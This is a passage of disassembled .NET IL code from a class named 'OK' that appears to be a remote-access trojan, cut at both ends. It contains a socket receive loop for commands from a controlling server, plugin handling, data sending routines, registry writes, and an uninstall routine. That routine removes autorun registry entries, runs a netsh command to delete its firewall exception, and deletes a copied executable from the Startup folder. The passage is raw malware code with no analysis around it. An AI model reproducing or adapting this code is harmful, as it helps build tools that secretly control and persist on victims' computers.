      IL_00e2:  ldloc.s    V_4
      IL_00e4:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00e9:  stloc.0
      IL_00ea:  ldstr      ""
      IL_00ef:  stloc.s    V_4
      IL_00f1:  ldloc.0
      IL_00f2:  ldc.i4.0
      IL_00f3:  conv.i8
      IL_00f4:  ceq
      IL_00f6:  stloc.s    V_14
      IL_00f8:  ldloc.s    V_14
      IL_00fa:  brfalse.s  IL_010a

      IL_00fc:  ldstr      ""
      IL_0101:  call       bool j.OK::Send(string)
      IL_0106:  pop
      IL_0107:  ldc.i4.m1
      IL_0108:  conv.i8
      IL_0109:  stloc.0
      IL_010a:  nop
      IL_010b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0110:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0115:  ldc.i4.0
      IL_0116:  cgt
      IL_0118:  ldc.i4.0
      IL_0119:  ceq
      IL_011b:  stloc.s    V_14
      IL_011d:  ldloc.s    V_14
      IL_011f:  brfalse.s  IL_0126

      IL_0121:  br         IL_0028

      IL_0126:  nop
      IL_0127:  br         IL_007e

      IL_012c:  nop
      IL_012d:  ldloc.s    V_4
      IL_012f:  ldloc.s    V_5
      IL_0131:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0136:  stloc.s    V_12
      IL_0138:  ldloca.s   V_12
      IL_013a:  call       instance string [mscorlib]System.Char::ToString()
      IL_013f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0144:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0149:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_014e:  stloc.s    V_4
      IL_0150:  nop
      IL_0151:  ldc.i4.1
      IL_0152:  stloc.s    V_14
      IL_0154:  ldloc.s    V_14
      IL_0156:  brtrue     IL_00af

      IL_015b:  nop
      IL_015c:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0161:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0166:  ldc.i4.1
      IL_0167:  add.ovf
      IL_0168:  ldc.i4.1
      IL_0169:  sub.ovf
      IL_016a:  ldc.i4.1
      IL_016b:  add.ovf
      IL_016c:  newarr     [mscorlib]System.Byte
      IL_0171:  stsfld     uint8[] j.OK::b
      IL_0176:  ldloc.0
      IL_0177:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_017c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0181:  sub.ovf
      IL_0182:  stloc.3
      IL_0183:  ldsfld     uint8[] j.OK::b
      IL_0188:  ldlen
      IL_0189:  conv.ovf.i4
      IL_018a:  conv.i8
      IL_018b:  ldloc.3
      IL_018c:  cgt
      IL_018e:  stloc.s    V_14
      IL_0190:  ldloc.s    V_14
      IL_0192:  brfalse.s  IL_01a9

      IL_0194:  ldloc.3
      IL_0195:  ldc.i4.1
      IL_0196:  conv.i8
      IL_0197:  sub.ovf
      IL_0198:  conv.ovf.i4
      IL_0199:  ldc.i4.1
      IL_019a:  add.ovf
      IL_019b:  ldc.i4.1
      IL_019c:  sub.ovf
      IL_019d:  ldc.i4.1
      IL_019e:  add.ovf
      IL_019f:  newarr     [mscorlib]System.Byte
      IL_01a4:  stsfld     uint8[] j.OK::b
      IL_01a9:  nop
      IL_01aa:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_01af:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_01b4:  ldsfld     uint8[] j.OK::b
      IL_01b9:  ldc.i4.0
      IL_01ba:  ldsfld     uint8[] j.OK::b
      IL_01bf:  ldlen
      IL_01c0:  conv.ovf.i4
      IL_01c1:  ldc.i4.0
      IL_01c2:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_01c7:  stloc.2
      IL_01c8:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01cd:  ldsfld     uint8[] j.OK::b
      IL_01d2:  ldc.i4.0
      IL_01d3:  ldloc.2
      IL_01d4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_01d9:  nop
      IL_01da:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01df:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_01e4:  ldloc.0
      IL_01e5:  ceq
      IL_01e7:  stloc.s    V_14
      IL_01e9:  ldloc.s    V_14
      IL_01eb:  brfalse.s  IL_0235

      IL_01ed:  ldc.i4.m1
      IL_01ee:  conv.i8
      IL_01ef:  stloc.0
      IL_01f0:  ldnull
      IL_01f1:  ldftn      void j.OK::_Lambda__1(object)
      IL_01f7:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_01fc:  ldc.i4.1
      IL_01fd:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0202:  stloc.s    V_6
      IL_0204:  ldloc.s    V_6
      IL_0206:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_020b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0210:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0215:  nop
      IL_0216:  ldloc.s    V_6
      IL_0218:  ldc.i4.s   100
      IL_021a:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_021f:  pop
      IL_0220:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0225:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_022a:  nop
      IL_022b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0230:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0235:  nop
      IL_0236:  br         IL_0028

      IL_023b:  nop
      IL_023c:  leave.s    IL_0260

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023e:  dup
      IL_023f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0244:  stloc.s    V_8
      IL_0246:  nop
      IL_0247:  ldloc.s    V_8
      IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_024e:  nop
      IL_024f:  ldloc.s    V_8
      IL_0251:  stloc.s    V_7
      IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0258:  nop
      IL_0259:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_025e:  leave.s    IL_0260

    }  // end handler
    IL_0260:  nop
    IL_0261:  nop
    IL_0262:  nop
    IL_0263:  nop
    IL_0264:  nop
    .try
    {
      IL_0265:  ldsfld     object j.OK::PLG
      IL_026a:  ldnull
      IL_026b:  ceq
      IL_026d:  ldc.i4.0
      IL_026e:  ceq
      IL_0270:  stloc.s    V_14
      IL_0272:  ldloc.s    V_14
      IL_0274:  brfalse.s  IL_029c

      IL_0276:  ldsfld     object j.OK::PLG
      IL_027b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0280:  ldnull
      IL_0281:  ldstr      "clear"
      IL_0286:  ldc.i4.0
      IL_0287:  newarr     [mscorlib]System.Object
      IL_028c:  ldnull
      IL_028d:  ldnull
      IL_028e:  ldnull
      IL_028f:  ldc.i4.1
      IL_0290:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0295:  pop
      IL_0296:  ldnull
      IL_0297:  stsfld     object j.OK::PLG
      IL_029c:  nop
      IL_029d:  leave.s    IL_02c1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_029f:  dup
      IL_02a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a5:  stloc.s    V_10
      IL_02a7:  nop
      IL_02a8:  ldloc.s    V_10
      IL_02aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02af:  nop
      IL_02b0:  ldloc.s    V_10
      IL_02b2:  stloc.s    V_9
      IL_02b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b9:  nop
      IL_02ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02bf:  leave.s    IL_02c1

    }  // end handler
    IL_02c1:  nop
    IL_02c2:  ldc.i4.0
    IL_02c3:  stsfld     bool j.OK::Cn
    IL_02c8:  call       bool j.OK::connect()
    IL_02cd:  ldc.i4.0
    IL_02ce:  ceq
    IL_02d0:  stloc.s    V_14
    IL_02d2:  ldloc.s    V_14
    IL_02d4:  brfalse.s  IL_02d8

    IL_02d6:  br.s       IL_0263

    IL_02d8:  nop
    IL_02d9:  ldc.i4.1
    IL_02da:  stsfld     bool j.OK::Cn
    IL_02df:  br         IL_0002

    IL_02e4:  nop
    IL_02e5:  ret
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldarga.s   S
    IL_0003:  call       uint8[] j.OK::SB(string&)
    IL_0008:  call       bool j.OK::Sendb(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       289 (0x121)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             uint8[] V_2,
             int32 V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.IO.FileInfo V_9,
             string V_10,
             bool V_11)
    IL_0000:  nop
    IL_0001:  ldsfld     bool j.OK::Cn
    IL_0006:  ldc.i4.0
    IL_0007:  ceq
    IL_0009:  stloc.s    V_11
    IL_000b:  ldloc.s    V_11
    IL_000d:  brfalse.s  IL_0016

    IL_000f:  ldc.i4.0
    IL_0010:  stloc.0
    IL_0011:  br         IL_011f

    IL_0016:  nop
    IL_0017:  nop
    .try
    {
      IL_0018:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_001d:  stloc.1
      IL_001e:  nop
      IL_001f:  ldloc.1
      IL_0020:  stloc.s    V_9
      IL_0022:  ldloc.s    V_9
      IL_0024:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      IL_0029:  nop
      IL_002a:  nop
      .try
      {
        IL_002b:  ldsfld     bool j.OK::Cn
        IL_0030:  ldc.i4.0
        IL_0031:  ceq
        IL_0033:  stloc.s    V_11
        IL_0035:  ldloc.s    V_11
        IL_0037:  brfalse.s  IL_0040

        IL_0039:  ldc.i4.0
        IL_003a:  stloc.0
        IL_003b:  leave      IL_011f

        IL_0040:  nop
        IL_0041:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0046:  stloc.s    V_4
        IL_0048:  ldarg.0
        IL_0049:  ldlen
        IL_004a:  conv.ovf.i4
        IL_004b:  stloc.3
        IL_004c:  ldloca.s   V_3
        IL_004e:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0053:  ldstr      bytearray (00 00 ) 
        IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_005d:  stloc.s    V_10
        IL_005f:  ldloca.s   V_10
        IL_0061:  call       uint8[] j.OK::SB(string&)
        IL_0066:  stloc.2
        IL_0067:  ldloc.s    V_4
        IL_0069:  ldloc.2
        IL_006a:  ldc.i4.0
        IL_006b:  ldloc.2
        IL_006c:  ldlen
        IL_006d:  conv.ovf.i4
        IL_006e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0073:  nop
        IL_0074:  ldloc.s    V_4
        IL_0076:  ldarg.0
        IL_0077:  ldc.i4.0
        IL_0078:  ldarg.0
        IL_0079:  ldlen
        IL_007a:  conv.ovf.i4
        IL_007b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0080:  nop
        IL_0081:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0086:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_008b:  ldloc.s    V_4
        IL_008d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0092:  ldc.i4.0
        IL_0093:  ldloc.s    V_4
        IL_0095:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_009a:  conv.ovf.i4
        IL_009b:  ldc.i4.0
        IL_009c:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_00a1:  pop
        IL_00a2:  nop
        IL_00a3:  leave.s    IL_00ae

      }  // end .try
      finally
      {
        IL_00a5:  ldloc.s    V_9
        IL_00a7:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_00ac:  nop
        IL_00ad:  endfinally
      }  // end handler
      IL_00ae:  nop
      IL_00af:  leave.s    IL_0116

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b1:  dup
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b7:  stloc.s    V_6
      IL_00b9:  nop
      IL_00ba:  ldloc.s    V_6
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c1:  nop
      IL_00c2:  ldloc.s    V_6
      IL_00c4:  stloc.s    V_5
      IL_00c6:  nop
      .try
      {
        IL_00c7:  ldsfld     bool j.OK::Cn
        IL_00cc:  stloc.s    V_11
        IL_00ce:  ldloc.s    V_11
        IL_00d0:  brfalse.s  IL_00e3

        IL_00d2:  ldc.i4.0
        IL_00d3:  stsfld     bool j.OK::Cn
        IL_00d8:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00dd:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00e2:  nop
        IL_00e3:  nop
        IL_00e4:  leave.s    IL_0108

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e6:  dup
        IL_00e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ec:  stloc.s    V_8
        IL_00ee:  nop
        IL_00ef:  ldloc.s    V_8
        IL_00f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00f6:  nop
        IL_00f7:  ldloc.s    V_8
        IL_00f9:  stloc.s    V_7
        IL_00fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0100:  nop
        IL_0101:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0106:  leave.s    IL_0108

      }  // end handler
      IL_0108:  nop
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  nop
      IL_010f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0114:  leave.s    IL_0116

    }  // end handler
    IL_0116:  nop
    IL_0117:  ldsfld     bool j.OK::Cn
    IL_011c:  stloc.0
    IL_011d:  br.s       IL_011f

    IL_011f:  ldloc.0
    IL_0120:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       104 (0x68)
    .maxstack  4
    .locals init (bool V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  ldarg.2
      IL_0037:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_003c:  nop
      IL_003d:  ldc.i4.1
      IL_003e:  stloc.0
      IL_003f:  leave.s    IL_0061

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0041:  dup
      IL_0042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0047:  stloc.3
      IL_0048:  nop
      IL_0049:  ldloc.3
      IL_004a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004f:  nop
      IL_0050:  ldloc.3
      IL_0051:  stloc.2
      IL_0052:  ldc.i4.0
      IL_0053:  stloc.0
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  nop
      IL_005a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005f:  leave.s    IL_0061

    }  // end handler
    IL_0061:  nop
    IL_0062:  ldloc.0
    IL_0063:  stloc.1
    IL_0064:  br.s       IL_0066

    IL_0066:  ldloc.1
    IL_0067:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       485 (0x1e5)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             bool V_12)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void j.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  ldc.i4.0
    IL_0009:  stsfld     bool j.OK::Isu
    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0014:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0019:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_001e:  ldsfld     string j.OK::sf
      IL_0023:  ldc.i4.1
      IL_0024:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0029:  ldsfld     string j.OK::RG
      IL_002e:  ldc.i4.0
      IL_002f:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0034:  nop
      IL_0035:  leave.s    IL_0055

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0037:  dup
      IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003d:  stloc.1
      IL_003e:  nop
      IL_003f:  ldloc.1
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0045:  nop
      IL_0046:  ldloc.1
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  nop
      IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0053:  leave.s    IL_0055

    }  // end handler
    IL_0055:  nop
    IL_0056:  nop
    .try
    {
      IL_0057:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_005c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0061:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0066:  ldsfld     string j.OK::sf
      IL_006b:  ldc.i4.1
      IL_006c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0071:  ldsfld     string j.OK::RG
      IL_0076:  ldc.i4.0
      IL_0077:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_007c:  nop
      IL_007d:  leave.s    IL_009d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_007f:  dup
      IL_0080:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0085:  stloc.3
      IL_0086:  nop
      IL_0087:  ldloc.3
      IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008d:  nop
      IL_008e:  ldloc.3
      IL_008f:  stloc.2
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0095:  nop
      IL_0096:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009b:  leave.s    IL_009d

    }  // end handler
    IL_009d:  nop
    IL_009e:  nop
    .try
    {
      IL_009f:  ldstr      "netsh firewall delete allowedprogram \""
      IL_00a4:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00a9:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00ae:  ldstr      "\""
      IL_00b3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b8:  ldc.i4.0
      IL_00b9:  ldc.i4.0
      IL_00ba:  ldc.i4.m1
      IL_00bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00c0:  pop
      IL_00c1:  leave.s    IL_00e5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c3:  dup
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c9:  stloc.s    V_5
      IL_00cb:  nop
      IL_00cc:  ldloc.s    V_5
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d3:  nop
      IL_00d4:  ldloc.s    V_5
      IL_00d6:  stloc.s    V_4
      IL_00d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00dd:  nop
      IL_00de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e3:  leave.s    IL_00e5

    }  // end handler
    IL_00e5:  nop
    IL_00e6:  nop
    .try
    {
      IL_00e7:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00ec:  ldnull
      IL_00ed:  ceq
      IL_00ef:  ldc.i4.0
      IL_00f0:  ceq
      IL_00f2:  stloc.s    V_12
      IL_00f4:  ldloc.s    V_12
      IL_00f6:  brfalse.s  IL_0123

      IL_00f8:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00fd:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0102:  nop
      IL_0103:  ldc.i4.7
      IL_0104:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0109:  ldstr      "\\"
      IL_010e:  ldsfld     string j.OK::RG
      IL_0113:  ldstr      ".exe"
      IL_0118:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_011d:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0122:  nop
      IL_0123:  nop
      IL_0124:  leave.s    IL_0148

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0126:  dup
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012c:  stloc.s    V_7
      IL_012e:  nop
      IL_012f:  ldloc.s    V_7
      IL_0131:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0136:  nop
      IL_0137:  ldloc.s    V_7
      IL_0139:  stloc.s    V_6
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  nop
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0146:  leave.s    IL_0148

    }  // end handler
    IL_0148:  nop
    IL_0149:  nop
    .try
    {
      IL_014a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_014f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0154:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0159:  ldstr      "Software"
      IL_015e:  ldc.i4.1
      IL_015f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0164:  ldsfld     string j.OK::RG
      IL_0169:  ldc.i4.0
      IL_016a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_016f:  nop
      IL_0170:  leave.s    IL_0194

    }  // end .try
